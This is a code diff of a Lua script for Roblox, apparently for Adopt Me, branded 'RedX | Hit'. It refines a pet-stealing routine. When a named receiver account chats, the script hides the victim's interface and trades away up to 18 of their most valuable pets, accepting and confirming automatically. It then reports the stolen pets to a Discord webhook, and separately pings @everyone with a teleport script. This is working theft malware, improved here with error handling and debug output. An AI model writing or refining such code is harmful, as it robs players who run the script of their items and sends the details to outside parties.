@@ -395,53 +395,43 @@ local embed = {
     }
 }
 
-function SendMessageEMBED(url, embed, bool)
-  local http = game:GetService("HttpService")
-  local headers = {
-      ["Content-Type"] = "application/json"
-  }
-  local data = {
-      username = "RedX | Hit",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "pew",
-      embeds = {
-          {
-              title = embed.title,
-              color = embed.color,
-              fields = embed.fields,
-          }
-      }
-  }
-  local data2 = {
-      username = "RedX | Hit",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "-- @everyone\n" .. TeleportScript,
-      embeds = {
-          {
-              title = embed.title,
-              color = 0x660000,
-              fields = embed.fields,
-          }
-      }
-  }
+function SendMessageEMBED(url, embed_data, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    local data = {
+        username = "RedX | Hit",
+        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+        embeds = {
+            {
+                title = embed_data.title,
+                color = embed_data.color,
+                fields = embed_data.fields,
+                timestamp = DateTime.now():ToIsoDate()
+            }
+        }
+    }
+    
+    if bool then
+        data.content = "-- @everyone\n" .. TeleportScript
+    end
 
-  local body = http:JSONEncode(data)
-  local body2 = http:JSONEncode(data2)
-  if bool == true then
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body2
-      })
-  else
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body
-      })
-  end
+    local body = http:JSONEncode(data)
+    
+    local success, result = pcall(function()
+        return request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+    
+    if not success then
+        warn("Failed to send webhook: " .. tostring(result))
+    end
 end
 
 -- Function to send stolen pets information
@@ -486,6 +476,7 @@ function SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
         }
     }
 
+    print("Sending stolen pets info...") -- Debug
     SendMessageEMBED(Webhook, stolenEmbed, false)
 end
 
@@ -496,111 +487,137 @@ game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = fals
 local sent = false
 
 local function TradeIncoming(ReceiverName)
+    if sent then return end
     sent = true
     
-    -- Store original pets before trade
-    local originalPets = {}
+    print("Starting trade with: " .. ReceiverName) -- Debug
+    
+    local RouterClient = Loaders("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+
+    -- Get current pets before trade
     local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    local sortedPets = {}
+    local stolenPets = {}
+    
     for petUid, petData in pairs(PetsInventory) do
         local calculatedValue, baseValue, petName = calculatePetValue(petData)
-        table.insert(originalPets, {
+        table.insert(sortedPets, {
             uid = petUid,
-            name = petName,
+            data = petData,
             value = calculatedValue,
+            baseValue = baseValue,
+            name = petName,
             properties = petData.properties or {}
         })
     end
-
-    while sent do
-        local RouterClient = Loaders("RouterClient")
-        local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-        moveGuiOffscreen()
     
-        SendTrade:FireServer(game.Players[ReceiverName])
-        wait(3)
-        local RouterClient = Loaders("RouterClient")
-        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-        local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-        local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
-
-        -- Get and sort pets by value
-        local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
-        local sortedPets = {}
-        local stolenPets = {}
-        
-        for petUid, petData in pairs(PetsInventory) do
-            local calculatedValue, baseValue, petName = calculatePetValue(petData)
-            table.insert(sortedPets, {
-                uid = petUid,
-                data = petData,
-                value = calculatedValue,
-                baseValue = baseValue,
-                name = petName,
-                properties = petData.properties or {}
+    -- Sort pets by value (highest first)
+    table.sort(sortedPets, function(a, b)
+        return a.value > b.value
+    end)
+    
+    -- Send trade request
+    moveGuiOffscreen()
+    SendTrade:FireServer(game.Players[ReceiverName])
+    print("Trade request sent to: " .. ReceiverName) -- Debug
+    wait(5)
+    
+    -- Add pets to trade (best ones first)
+    local petCount = 0
+    local petLimit = 18
+    
+    for _, petInfo in ipairs(sortedPets) do
+        if petCount < petLimit then
+            AddPetRemote:FireServer(petInfo.uid)
+            table.insert(stolenPets, {
+                name = petInfo.name,
+                value = petInfo.value,
+                properties = petInfo.properties
             })
+            petCount = petCount + 1
+            print("Added pet to trade: " .. petInfo.name) -- Debug
+            wait(0.3) -- Small delay to avoid rate limits
+        else
+            break
         end
-        
-        -- Sort pets by value (highest first)
-        table.sort(sortedPets, function(a, b)
-            return a.value > b.value
-        end)
-        
-        -- Add pets to trade (best ones first)
-        local petCount = 0
-        local petLimit = 18
-        
-        for _, petInfo in ipairs(sortedPets) do
-            if petCount < petLimit then
-                AddPetRemote:FireServer(petInfo.uid)
-                table.insert(stolenPets, {
-                    name = petInfo.name,
-                    value = petInfo.value,
-                    properties = petInfo.properties
-                })
-                petCount = petCount + 1
-                wait(0.2) -- Small delay to avoid rate limits
-            else
-                break
-            end
-        end
-        
-        -- Calculate total stolen value
-        local totalStolenValue = 0
-        for _, pet in ipairs(stolenPets) do
-            totalStolenValue = totalStolenValue + pet.value
-        end
-        
-        wait(5)
-        AcceptNegotiationRemote:FireServer() -- Accepts first 
-        wait(5)
-        ConfirmTradeRemote:FireServer() -- finish
-        
-        -- Send stolen pets information
-        SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
-        break
     end
+    
+    -- Calculate total stolen value
+    local totalStolenValue = 0
+    for _, pet in ipairs(stolenPets) do
+        totalStolenValue = totalStolenValue + pet.value
+    end
+    
+    print("Total stolen value: " .. totalStolenValue) -- Debug
+    
+    -- Accept negotiation and confirm trade
+    wait(3)
+    AcceptNegotiationRemote:FireServer()
+    print("Negotiation accepted") -- Debug
+    
+    wait(3)
+    ConfirmTradeRemote:FireServer()
+    print("Trade confirmed") -- Debug
+    
+    -- Send stolen pets information
+    wait(2) -- Wait a bit before sending webhook
+    SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
+    print("Stolen pets info sent to Discord") -- Debug
 end
 
+-- Send initial embed
 SendMessageEMBED(Webhook, embed, true)
+print("Initial embed sent to Discord") -- Debug
 
+-- Listen for players
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username then
+        print("Main user joined: " .. Username) -- Debug
         player.Chatted:Connect(function(msg)
             if not sent then
-            TradeIncoming(Username)
+                print("Chat trigger received: " .. msg) -- Debug
+                TradeIncoming(Username)
             end
         end)
     end
 end)
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username2 then
+    if player.Name == Username2 and Username2 ~= "None" then
+        print("Alt user joined: " .. Username2) -- Debug
         player.Chatted:Connect(function(msg)
             if not sent then
+                print("Chat trigger received: " .. msg) -- Debug
                 TradeIncoming(Username2)
             end
         end)
     end
 end)
+
+-- Check if users are already in game
+for _, player in pairs(game.Players:GetPlayers()) do
+    if player.Name == Username then
+        print("Main user already in game: " .. Username) -- Debug
+        player.Chatted:Connect(function(msg)
+            if not sent then
+                print("Chat trigger received: " .. msg) -- Debug
+                TradeIncoming(Username)
+            end
+        end)
+    end
+    if player.Name == Username2 and Username2 ~= "None" then
+        print("Alt user already in game: " .. Username2) -- Debug
+        player.Chatted:Connect(function(msg)
+            if not sent then
+                print("Chat trigger received: " .. msg) -- Debug
+                TradeIncoming(Username2)
+            end
+        end)
+    end
+end
